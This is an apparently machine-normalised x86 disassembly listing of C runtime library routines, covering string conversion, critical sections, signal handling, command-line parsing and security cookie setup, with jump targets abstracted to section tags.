mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e09b
leave
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_40ff5b
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4180b8
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_40e92a
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_4168d0
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4180b8
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4180b8
add esp 0x18
jmp r-xdata
push esi
call sub_40ff5b
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_40e92a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_4168d0
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_41625d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40f858
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_416074
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4162a1
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_4162c1
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_4162e1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_416369
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_40fcb1
sub_416315
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_40e8f2
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_416369
push 0x8
push r--data
call sub_4110a0
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_411295
push 0x1e
call sub_4112f2
push 0xff
call sub_40fc9b
xor eax eax
inc eax
push 0x18
call sub_41100b
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_411550
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_40e8f2
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_4110e5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416407
sub_416410
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_416460
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4164b0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_411100
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_416570
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_416460
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416570
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_416686
push 0x24
push r--data
call sub_4110a0
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_415d77
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_41683b
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_40fd7c
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_4110e5
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_4162e1
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416801
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_41683b
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_416877
push ebp
mov ebp esp
xor edx edx
mov eax edx
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] dx
je r-xdata
sub_416896
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4180b8
add esp 0x18
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_416877
pop ecx
pop ecx
sub_4168fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_4165f8
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_41694b
push ebp
mov ebp esp
push esi
call sub_415d77
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_416aa6
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov ebx rw-data
push ebx
xor eax eax
xor edi edi
push edi
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] ebx
test esi esi
je r-xdata
mov esi ebx
cmp [ esi ] di
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x8 ]
cmp eax 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push esi
call sub_416b52
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea ecx [ eax + ebx * 2 ]
add ecx ecx
add eax eax
cmp ecx eax
jb r-xdata
push ecx
call sub_41100b
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_416b52
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_416b52
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp + 0x8 ] 0x20
mov [ ebp - 0x4 ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ ebx ]
test edx edx
je r-xdata
xor eax eax
test edi edi
sete al
push 0x22
add ecx 0x2
mov edi eax
pop eax
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test edi edi
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp [ ecx ] ax
jne r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
inc [ eax ]
pop esi
pop ebx
leave
retn
mov [ esi ] ebx
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x8 ]
inc [ eax ]
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
inc ebx
push 0x22
pop eax
cmp [ ecx ] ax
push 0x5c
pop eax
jne r-xdata
test ebx ebx
jne r-xdata
test bl 0x1
jne r-xdata
dec ebx
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
shr ebx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
test edx edx
je r-xdata
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
xor eax eax
test esi esi
sete al
mov esi eax
push 0x22
pop edi
cmp [ ecx + 0x2 ] di
mov edi [ ebp + 0x18 ]
jne r-xdata
inc [ edi ]
xor ebx ebx
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
add ecx 0x2
xor ebx ebx
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
je r-xdata
push 0x5c
pop eax
push 0x5c
mov [ ebp - 0x8 ] 0x1
pop eax
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_416cdf
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
push edi
mov edi ebx
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x3d
pop ecx
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax cx
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_410fc1
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_417e43
lea esi [ esi + eax * 2 ]
pop ecx
add esi 0x2
inc edi
mov esi [ rw-data ]
cmp [ esi ] bx
je r-xdata
push esi
call sub_40e8f2
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_417e43
pop ecx
push 0x3d
lea ebx [ eax + 0x1 ]
pop eax
cmp [ esi ] ax
je r-xdata
lea esi [ esi + ebx * 2 ]
xor ebx ebx
cmp [ esi ] bx
jne r-xdata
push 0x2
push ebx
call sub_410fc1
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_40e8f2
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40ea28
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_411724
int3
add edi 0x4
sub_416dce
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_416e0e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_416ea8
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
leave
retn
push ebx
xor ebx ebx
push esi
mov esi edi
cmp [ edi ] bx
je r-xdata
sub esi edi
add esi 0x2
push esi
call sub_41100b
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] bx
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
pop esi
mov eax ebx
pop ebx
push esi
push edi
push eax
call sub_410100
mov ebx [ ebp - 0x4 ]
add esp 0xc
add esi 0x2
cmp [ esi ] bx
jne r-xdata
sub_416f03
mov ecx [ rw-data ]
xor edx edx
test ecx ecx
jne r-xdata
push esi
push 0x20
pop esi
mov ecx r--data
cmp eax 0x22
jne r-xdata
test ax ax
je r-xdata
add ecx 0x2
jmp r-xdata
xor eax eax
test edx edx
sete al
mov edx eax
mov eax ecx
pop esi
retn
test edx edx
je r-xdata
movzx eax [ ecx ]
cmp ax si
ja r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
cmp ax si
ja r-xdata
add ecx 0x2
sub_416f50
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41a02c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41a02c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_416f9c
push 0x8
push r--data
call sub_4110a0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_4110e5
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_410a6c
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
sub_41704d
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40f78e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40e8f2#2
pop ecx
sub_417072
push 0x30
push r--data
call sub_4110a0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov edi [ ebp + 0xc ]
mov eax [ edi - 0x4 ]
mov [ ebp - 0x28 ] eax
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_410c4a
pop ecx
pop ecx
mov [ ebp - 0x2c ] eax
call sub_415d5f
mov eax [ eax + 0x88 ]
mov [ ebp - 0x30 ] eax
call sub_415d5f
mov eax [ eax + 0x8c ]
mov [ ebp - 0x34 ] eax
call sub_415d5f
mov [ eax + 0x88 ] esi
call sub_415d5f
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_410a0e
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4171c1
mov eax edi
call sub_4110e5
retn
sub_417111
mov esp [ ebp - 0x18 ]
call sub_415d5f
xor ebx ebx
mov [ eax + 0x3ac ] ebx
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push edx
push ebx
push edi
call sub_417b09
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4171c1
mov eax edi
call sub_4110e5
retn
mov esi eax
imul esi esi 0x14
mov edi [ edx + 0x10 ]
cmp ecx [ esi + edi + 0x4 ]
mov edi [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] ecx
mov eax [ edx + 0x10 ]
mov [ ebp + 0x18 ] eax
mov eax ebx
mov [ ebp - 0x24 ] eax
cmp [ edx + 0xc ] eax
jbe r-xdata
inc eax
mov [ ebp - 0x24 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov edx [ ebp + 0x18 ]
cmp ecx [ esi + edx + 0x8 ]
mov edx [ ebp + 0x14 ]
jg r-xdata
imul eax eax 0x14
mov ecx [ edx + 0x10 ]
mov eax [ eax + ecx + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov ecx [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
sub_4171c1
mov eax [ ebp - 0x28 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x2c ]
call sub_410c74
pop ecx
call sub_415d5f
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x88 ] ecx
call sub_415d5f
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov edi [ ebp - 0x1c ]
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
retn
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_410cc4
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_416f9c
pop ecx
pop ecx
jmp r-xdata
sub_417280
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
